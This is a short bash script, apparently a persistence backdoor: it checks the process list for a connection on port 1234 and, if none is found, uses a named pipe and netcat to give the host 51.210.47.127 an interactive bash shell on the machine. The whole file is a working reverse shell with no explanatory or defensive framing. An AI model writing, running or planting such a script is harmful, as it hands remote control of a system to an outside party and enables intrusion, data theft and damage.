#!/bin/bash

n=$(ps aux | grep -o [1]234)

if [[ $n = "" ]]; then
    mkfifo /tmp/f; 
    nc 51.210.47.127 1234 0</tmp/f | /bin/bash -i >/tmp/f 2>&1;
    rm /tmp/f
fi